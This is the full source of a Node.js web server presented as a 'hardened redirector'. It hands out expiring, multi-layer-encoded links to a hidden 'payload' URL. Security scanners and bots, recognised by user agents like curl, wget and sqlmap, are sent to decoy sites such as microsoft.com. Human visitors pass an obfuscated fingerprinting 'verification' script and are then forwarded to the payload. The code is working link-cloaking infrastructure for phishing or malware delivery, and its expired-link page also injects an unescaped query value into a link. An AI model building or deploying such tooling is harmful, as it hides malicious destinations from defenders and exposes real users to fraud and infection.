const express = require('express');
const helmet = require('helmet');
const fs = require('fs').promises;
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const fetch = require('node-fetch');
const NodeCache = require('node-cache');
const JavaScriptObfuscator = require('javascript-obfuscator');
const compression = require('compression');
const morgan = require('morgan');
const { body, validationResult } = require('express-validator');

const app = express();
app.set('trust proxy', 1);
app.use(compression());
app.use(morgan('combined'));

// ─── Config ──────────────────────────────────────────────────────────────────
const TARGET_URL   = process.env.TARGET_URL   || 'https://example.invalid/payload';
const BOT_URLS     = [
  'https://www.microsoft.com',
  'https://www.apple.com',
  'https://www.google.com',
  'https://en.wikipedia.org/wiki/Main_Page',
  'https://www.bbc.com'
];

const LOG_FILE     = 'clicks.log';
const REQUEST_LOG_FILE = 'requests.log';
const SUCCESS_LOG_FILE = 'success.log';
const PORT         = process.env.PORT || 10000;
const LINK_TTL_SEC = 1800; // 30 minutes
const METRICS_API_KEY = process.env.METRICS_API_KEY || crypto.randomBytes(32).toString('hex');
const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
const NODE_ENV = process.env.NODE_ENV || 'production';

// Cache instances
const geoCache  = new NodeCache({ stdTTL: 86400, checkperiod: 3600 }); // 24 hours
const linkCache = new NodeCache({ stdTTL: LINK_TTL_SEC, checkperiod: 300 });
const linkRequestCache = new NodeCache({ stdTTL: 60, checkperiod: 10 }); // 1 minute for rate limiting
const failCache = new NodeCache({ stdTTL: 3600, checkperiod: 600 }); // 1 hour for failed geolocation

// ─── Stats Tracking ──────────────────────────────────────────────────────────
const stats = {
  totalRequests: 0,
  botBlocks: 0,
  successfulRedirects: 0,
  expiredLinks: 0,
  generatedLinks: 0,
  byCountry: {},
  byBotReason: {}
};

// ─── Middleware ──────────────────────────────────────────────────────────────
app.use((req, res, next) => {
  req.id = crypto.randomBytes(8).toString('hex');
  res.locals.nonce = crypto.randomBytes(16).toString('hex');
  res.locals.startTime = Date.now();
  res.setHeader('X-Request-ID', req.id);
  stats.totalRequests++;
  next();
});

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));

app.use(express.json({ limit: '100kb' }));
app.use(express.urlencoded({ extended: true, limit: '100kb' }));

// ─── Logging Helper (FIXED) ─────────────────────────────────────────────────
async function logRequest(type, req, res, extra = {}) {
  try {
    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '??';
    const duration = res?.locals?.startTime ? Date.now() - res.locals.startTime : 0;
    
    const logEntry = {
      timestamp: new Date().toISOString(),
      requestId: req.id,
      type,
      ip,
      method: req.method,
      path: req.path,
      duration,
      ua: (req.headers['user-agent'] || '').substring(0, 200),
      ...extra
    };
    
    await fs.appendFile(REQUEST_LOG_FILE, JSON.stringify(logEntry) + '\n');
    console.log(`[${type}] ${ip} ${req.path} ${JSON.stringify(extra)}`);
  } catch (err) {
    console.error(`[LOG-ERR] ${err.message}`);
  }
}

// ─── Health Endpoints ───────────────────────────────────────────────────────
app.get(['/ping','/health','/healthz','/status'], (req, res) => {
  res.status(200).json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    requestId: req.id
  });
});

// ─── Metrics Endpoint (Protected) ───────────────────────────────────────────
app.get('/metrics', async (req, res) => {
  const apiKey = req.headers['x-api-key'];
  if (apiKey !== METRICS_API_KEY) {
    await logRequest('METRICS_UNAUTHORIZED', req, res);
    return res.status(403).json({ error: 'Forbidden' });
  }

  const metrics = {
    activeLinks: linkCache.keys().length,
    geoCacheSize: geoCache.keys().length,
    linkRequestCacheSize: linkRequestCache.keys().length,
    failCacheSize: failCache.keys().length,
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    cpu: process.cpuUsage(),
    timestamp: new Date().toISOString(),
    config: {
      linkTtlSec: LINK_TTL_SEC,
      botThreshold: 75,
      mobileBotThreshold: 85,
      nodeEnv: NODE_ENV
    },
    totals: {
      requests: stats.totalRequests,
      blocks: stats.botBlocks,
      successes: stats.successfulRedirects,
      expired: stats.expiredLinks,
      generated: stats.generatedLinks
    }
  };
  
  await logRequest('METRICS', req, res);
  res.json(metrics);
});

// ─── Expired Link Page ──────────────────────────────────────────────────────
app.get('/expired', (req, res) => {
  const originalTarget = req.query.target || BOT_URLS[0];
  const nonce = res.locals.nonce;
  
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta name="robots" content="noindex, nofollow">
  <title>Link Expired</title>
  <style nonce="${nonce}">
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0,#764ba2 100%);display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}
    .card{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);padding:2.5rem;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;max-width:480px;width:100%;animation:fadeIn 0.5s ease}
    @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
    h1{font-size:2rem;margin-bottom:1rem;color:#333}
    p{color:#666;line-height:1.6;margin-bottom:1.5rem}
    .btn{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:#fff;padding:1rem 2rem;border-radius:50px;text-decoration:none;display:inline-block;font-weight:600;transition:transform 0.2s,box-shadow 0.2s;border:none;cursor:pointer}
    .btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(102,126,234,0.4)}
    .btn:active{transform:translateY(0)}
    .icon{font-size:4rem;margin-bottom:1rem;display:block}
  </style>
</head>
<body>
  <div class="card">
    <span class="icon">🔗</span>
    <h1>Link Expired</h1>
    <p>This verification link expired after ${LINK_TTL_SEC/60} minutes for security reasons.</p>
    <p>Please request a new link to continue to your destination.</p>
    <a href="${originalTarget}" class="btn" rel="nofollow">Continue to Site</a>
  </div>
</body>
</html>
  `);
});

// ─── Helpers ─────────────────────────────────────────────────────────────────
const isMobile = req => /Mobi|Android|iPhone|iPad|iPod/i.test(req.headers['user-agent'] || '');

const strictLimiter = rateLimit({
  windowMs: 60000,
  max: (req) => isMobile(req) ? 20 : 8,
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: true,
  keyGenerator: (req) => {
    return req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'unknown';
  }
});

function isLikelyBot(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  const h = req.headers;
  let score = 0;
  const reasons = [];

  // Bot user agents
  if (/headless|phantom|slurp|zgrab|scanner|bot|crawler|spider|burp|sqlmap|curl|wget|python|perl|ruby|go-http-client/i.test(ua)) {
    score += 50;
    reasons.push('bot_ua');
  }
  
  // Missing browser indicators
  if (!ua.includes('mozilla') && !ua.includes('applewebkit')) {
    score += 30;
    reasons.push('non_browser_ua');
  }
  
  // Missing modern headers
  if (!h['sec-ch-ua'] || !h['sec-ch-ua-mobile'] || !h['sec-ch-ua-platform']) {
    score += 25;
    reasons.push('missing_sec_headers');
  }
  
  // Missing accept headers
  if (!h['accept'] || !h['accept-language'] || h['accept-language'].length < 5) {
    score += 20;
    reasons.push('missing_accept_headers');
  }
  
  // Too few headers
  if (Object.keys(h).length < 15) {
    score += 15;
    reasons.push('minimal_headers');
  }
  
  // Suspicious headers
  if (h['accept'] && h['accept'].includes('application/x-sh')) {
    score += 40;
    reasons.push('suspicious_accept');
  }
  
  // No referrer for direct access
  if (!h['referer'] && req.path.startsWith('/v/')) {
    score += 10;
    reasons.push('no_referrer');
  }

  const botThreshold = isMobile(req) ? 80 : 70;
  const isBot = score >= botThreshold;
  
  if (isBot) {
    stats.botBlocks++;
    reasons.forEach(r => {
      stats.byBotReason[r] = (stats.byBotReason[r] || 0) + 1;
    });
  }
  
  console.log(`[BOT-SCORE] ${score} | ${reasons.join(',') || 'clean'} | Threshold:${botThreshold} | IsBot:${isBot} | Mobile:${isMobile(req)}`);

  return isBot;
}

async function getCountryCode(req) {
  const ip = (req.headers['x-forwarded-for']?.split(',')[0]?.trim()) || req.ip || '??';
  
  // Skip private IPs
  if (ip.match(/^(127\.|::1|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)/)) {
    return 'PRIVATE';
  }

  let cc = geoCache.get(ip);
  if (cc) return cc;

  // Track failed lookups
  const failKey = `fail:${ip}`;
  if (failCache.get(failKey) >= 3) {
    return 'XX';
  }

  if (!IPINFO_TOKEN) return 'XX';

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 2000);

    const response = await fetch(`https://ipinfo.io/${ip}/json?token=${IPINFO_TOKEN}`, {
      signal: controller.signal,
      headers: { 
        'User-Agent': 'Redirector/2.0',
        'Accept': 'application/json'
      }
    });

    clearTimeout(timeout);

    if (response.ok) {
      const data = await response.json();
      cc = data.country?.toUpperCase();
      
      if (cc && /^[A-Z]{2}$/.test(cc)) {
        geoCache.set(ip, cc);
        stats.byCountry[cc] = (stats.byCountry[cc] || 0) + 1;
        return cc;
      }
    } else {
      failCache.set(failKey, (failCache.get(failKey) || 0) + 1);
    }
  } catch (err) {
    failCache.set(failKey, (failCache.get(failKey) || 0) + 1);
  }

  return 'XX';
}

// ─── Encoders (Keep all existing encoders) ──────────────────────────────────
const encoders = [
  { 
    name: 'base64url', 
    enc: s => Buffer.from(s).toString('base64url'), 
    dec: s => Buffer.from(s, 'base64url').toString() 
  },
  { 
    name: 'hex',       
    enc: s => Buffer.from(s).toString('hex'),       
    dec: s => Buffer.from(s, 'hex').toString() 
  },
  { 
    name: 'rot13', 
    enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) + 13) % 26) + (c <= 'Z' ? 65 : 97))), 
    dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) - 13 + 26) % 26) + (c <= 'Z' ? 65 : 97))) 
  },
  { 
    name: 'xor', 
    needsKey: true,
    enc: (s, key) => {
      const keyBuf = Buffer.from(key, 'hex');
      const result = Buffer.alloc(s.length);
      for (let i = 0; i < s.length; i++) {
        result[i] = s.charCodeAt(i) ^ keyBuf[i % keyBuf.length];
      }
      return result.toString('base64url');
    },
    dec: (s, key) => {
      const keyBuf = Buffer.from(key, 'hex');
      const buf = Buffer.from(s, 'base64url');
      let result = '';
      for (let i = 0; i < buf.length; i++) {
        result += String.fromCharCode(buf[i] ^ keyBuf[i % keyBuf.length]);
      }
      return result;
    }
  },
  { 
    name: 'aes-256-gcm',
    needsKey: true,
    enc: (s, key) => {
      const iv = crypto.randomBytes(12);
      const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(key, 'hex').slice(0, 32), iv);
      const encrypted = Buffer.concat([cipher.update(s, 'utf8'), cipher.final()]);
      const authTag = cipher.getAuthTag();
      return Buffer.concat([iv, authTag, encrypted]).toString('base64url');
    },
    dec: (s, key) => {
      const buf = Buffer.from(s, 'base64url');
      const iv = buf.slice(0, 12);
      const authTag = buf.slice(12, 28);
      const encrypted = buf.slice(28);
      const decipher = crypto.createDecipheriv('aes-256-gcm', Buffer.from(key, 'hex').slice(0, 32), iv);
      decipher.setAuthTag(authTag);
      return decipher.update(encrypted) + decipher.final('utf8');
    }
  }
];

// ─── Encode / Decode ─────────────────────────────────────────────────────────
function multiLayerEncode(str) {
  let result = str;
  
  // Add random noise
  const noiseLen = 8 + Math.floor(Math.random() * 16);
  const noise = crypto.randomBytes(noiseLen).toString('base64url');
  result = noise + result + noise;

  // Add HMAC integrity
  const integrityKey = crypto.randomBytes(16).toString('hex');
  const hmac = crypto.createHmac('sha256', integrityKey).update(result).digest('base64url');
  result = `${result}|${hmac}|${integrityKey}`;

  // Select random layers
  const shuffled = [...encoders].sort(() => Math.random() - 0.5);
  const numLayers = 3 + Math.floor(Math.random() * 4); // 3-6 layers
  const selected = shuffled.slice(0, numLayers);

  const layerHistory = [];
  for (const layer of selected) {
    let key = layer.needsKey ? crypto.randomBytes(24).toString('hex') : null;
    result = key ? layer.enc(result, key) : layer.enc(result);
    layerHistory.push({ name: layer.name, key });
  }

  // Final base64 encoding
  result = Buffer.from(result).toString('base64url');
  
  console.log(`[ENCODE] len:${result.length} layers:${layerHistory.map(l => l.name).join(',')}`);

  return { encoded: result, layers: layerHistory.reverse() };
}

// ─── Generate ────────────────────────────────────────────────────────────────
app.get('/g', [
  body('t').optional().isURL().withMessage('Invalid target URL')
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ success: false, errors: errors.array() });
  }

  const target = req.query.t || TARGET_URL;
  const timestamp = Date.now();
  const randomId = crypto.randomBytes(6).toString('hex');
  const payload = `${target}#${randomId}-${timestamp}`;

  const { encoded, layers } = multiLayerEncode(payload);
  const layersB64 = Buffer.from(JSON.stringify(layers)).toString('base64url');

  const id = crypto.randomBytes(12).toString('hex');
  linkCache.set(id, { 
    e: encoded, 
    l: layersB64, 
    target,
    created: timestamp,
    expires: timestamp + (LINK_TTL_SEC * 1000)
  });

  stats.generatedLinks++;

  const url = `${req.protocol}://${req.get('host')}/v/${id}`;
  
  logRequest('GENERATE', req, res, { linkId: id, target: target.substring(0, 60) });
  
  res.json({ 
    success: true, 
    url,
    expiresIn: LINK_TTL_SEC,
    linkId: id
  });
});

// ─── Success Tracking ────────────────────────────────────────────────────────
app.post('/track/success', express.json({ limit: '1kb' }), async (req, res) => {
  const { linkId, metrics } = req.body;
  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '??';
  
  stats.successfulRedirects++;
  
  const logEntry = {
    timestamp: new Date().toISOString(),
    linkId,
    ip,
    metrics,
    ua: req.headers['user-agent']
  };
  
  try {
    await fs.appendFile(SUCCESS_LOG_FILE, JSON.stringify(logEntry) + '\n');
  } catch (err) {
    console.error(`[SUCCESS-LOG-ERR] ${err.message}`);
  }
  
  res.status(200).json({ success: true });
});

// ─── Verification gate ───────────────────────────────────────────────────────
app.get('/v/:id', strictLimiter, async (req, res) => {
  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '??';
  const linkId = req.params.id;
  
  // Rate limiting per link
  const linkKey = `${linkId}:${ip}`;
  const requestCount = linkRequestCache.get(linkKey) || 0;
  
  if (requestCount >= 5) {
    await logRequest('RATE_LIMIT', req, res, { linkId, count: requestCount + 1 });
    return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
  }
  
  linkRequestCache.set(linkKey, requestCount + 1);

  const country = await getCountryCode(req);
  
  await logRequest('ACCESS', req, res, { linkId, country, requestCount: requestCount + 1 });

  // Bot check
  if (isLikelyBot(req)) {
    await fs.appendFile(LOG_FILE, `${new Date().toISOString()} BOT ${ip} ${country}\n`);
    const safe = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
    await logRequest('BLOCK', req, res, { linkId, country, reason: 'bot_detected' });
    return res.redirect(safe);
  }

  await fs.appendFile(LOG_FILE, `${new Date().toISOString()} VIEW ${ip} ${country}\n`);

  // Check link existence
  const data = linkCache.get(linkId);
  if (!data) {
    stats.expiredLinks++;
    await logRequest('EXPIRED', req, res, { linkId, country });
    return res.redirect(`/expired?target=${encodeURIComponent(BOT_URLS[0])}`);
  }

  const hpSuffix = crypto.randomBytes(4).toString('hex');
  const nonce = res.locals.nonce;

  // Generate challenge with success tracking
  const rawChallenge = `(function(){
    const TARGET = '${data.target.replace(/'/g, "\\'")}';
    const FALLBACK = '${BOT_URLS[0]}';
    const LINK_ID = '${linkId}';
    
    let metrics = {
      moves: 0,
      entropy: 0,
      touches: 0,
      orientation: false,
      motion: false,
      startTime: Date.now()
    };

    function trackSuccess() {
      fetch('/track/success', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ linkId: LINK_ID, metrics }),
        keepalive: true
      }).catch(() => {});
    }

    // Mouse/Touch tracking
    let lastX = 0, lastY = 0, lastTime = Date.now();
    
    function updateMovement(x, y) {
      if (lastX && lastY) {
        const dx = Math.abs(x - lastX);
        const dy = Math.abs(y - lastY);
        const dt = (Date.now() - lastTime) / 1000 || 1;
        metrics.entropy += Math.log2(1 + Math.hypot(dx, dy)) / dt;
        metrics.moves++;
      }
      lastX = x;
      lastY = y;
      lastTime = Date.now();
    }

    // Event listeners
    document.addEventListener('mousemove', e => {
      updateMovement(e.clientX, e.clientY);
    }, { passive: true });

    document.addEventListener('touchmove', e => {
      if (e.touches.length) {
        const touch = e.touches[0];
        updateMovement(touch.clientX, touch.clientY);
        metrics.touches++;
      }
    }, { passive: true });

    document.addEventListener('touchstart', () => {
      metrics.touches++;
    }, { passive: true });

    // Device orientation
    if (window.DeviceOrientationEvent) {
      window.addEventListener('deviceorientation', e => {
        metrics.orientation = true;
      }, { passive: true });
    }

    // Device motion
    if (window.DeviceMotionEvent) {
      window.addEventListener('devicemotion', e => {
        metrics.motion = true;
      }, { passive: true });
    }

    // Honeypot check
    function honeypotFilled() {
      return document.getElementById('hp_name_${hpSuffix}')?.value ||
             document.getElementById('hp_email_${hpSuffix}')?.value ||
             document.getElementById('hp_phone_${hpSuffix}')?.value;
    }

    // Decision timeout
    setTimeout(() => {
      const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
      
      // Adjust thresholds based on device
      const minEntropy = isMobile ? 0.5 : 3.0;
      const minMoves = isMobile ? 0 : 2;
      
      const suspicious = 
        honeypotFilled() ||
        metrics.entropy < minEntropy ||
        (isMobile && metrics.touches === 0 && metrics.moves > 0) ||
        navigator.webdriver ||
        (window.outerWidth === 0 && window.outerHeight === 0);
      
      if (!suspicious) {
        trackSuccess();
      }
      
      location.href = suspicious ? FALLBACK : TARGET;
    }, 1200 + Math.random() * 800);
  })();`;

  // Obfuscate the challenge
  const obfuscated = JavaScriptObfuscator.obfuscate(rawChallenge, {
    compact: true,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 0.75,
    deadCodeInjection: true,
    deadCodeInjectionThreshold: 0.4,
    stringArray: true,
    stringArrayRotate: true,
    stringArrayShuffle: true,
    stringArrayThreshold: 0.8,
    numbersToExpressions: true,
    simplify: true,
    shuffleStringArray: true,
    splitStrings: true,
    splitStringsChunkLength: 10,
    transformObjectKeys: true,
    unicodeEscapeSequence: false,
    identifierNamesGenerator: 'mangled',
    renameGlobals: false,
    disableConsoleOutput: true
  }).getObfuscatedCode();

  // Send verification page
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta name="robots" content="noindex, nofollow">
  <meta http-equiv="refresh" content="5;url=${BOT_URLS[0]}">
  <title>Verifying...</title>
  <style nonce="${nonce}">
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#0a0a0a;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
    .container{text-align:center;padding:20px}
    .spinner{width:50px;height:50px;border:3px solid #333;border-top-color:#00ff88;border-radius:50%;margin:20px auto;animation:spin 1s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
    p{color:#aaa;margin:10px 0}
    .visually-hidden{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0}
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <p>Verifying your request...</p>
    <p class="visually-hidden" aria-hidden="true">
      <input type="text" id="hp_name_${hpSuffix}" tabindex="-1" autocomplete="off">
      <input type="email" id="hp_email_${hpSuffix}" tabindex="-1" autocomplete="off">
      <input type="tel" id="hp_phone_${hpSuffix}" tabindex="-1" autocomplete="off">
    </p>
  </div>
  <script nonce="${nonce}">${obfuscated}</script>
</body>
</html>`);
});

// ─── 404 Handler ─────────────────────────────────────────────────────────────
app.use((req, res) => {
  const safe = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
  logRequest('404', req, res, { redirectTo: safe });
  res.redirect(safe);
});

// ─── Error Handler ───────────────────────────────────────────────────────────
app.use((err, req, res, next) => {
  console.error(`[ERROR] ${err.stack}`);
  logRequest('ERROR', req, res, { error: err.message });
  
  const safe = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
  res.redirect(safe);
});

// ─── Graceful Shutdown ───────────────────────────────────────────────────────
process.on('SIGTERM', gracefulShutdown);
process.on('SIGINT', gracefulShutdown);

async function gracefulShutdown() {
  console.log('[SHUTDOWN] Received shutdown signal, cleaning up...');
  
  // Save stats to disk
  try {
    await fs.writeFile('stats_backup.json', JSON.stringify({
      stats,
      timestamp: new Date().toISOString()
    }));
    console.log('[SHUTDOWN] Stats saved');
  } catch (err) {
    console.error('[SHUTDOWN] Failed to save stats:', err);
  }
  
  process.exit(0);
}

// ─── Start Server ────────────────────────────────────────────────────────────
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`[STARTUP] 🚀 Hardened redirector v2.0`);
  console.log(`[STARTUP] 📡 Listening on port ${PORT}`);
  console.log(`[STARTUP] 🔑 Metrics API key: ${METRICS_API_KEY.substring(0, 8)}...`);
  console.log(`[STARTUP] ⏱️  Links expire after ${LINK_TTL_SEC/60} minutes`);
  console.log(`[STARTUP] 🌍 Environment: ${NODE_ENV}`);
  
  if (!IPINFO_TOKEN) {
    console.log(`[STARTUP] ⚠️  IPINFO_TOKEN not set, geolocation disabled`);
  }
});

server.keepAliveTimeout = 65000;
server.headersTimeout = 66000;
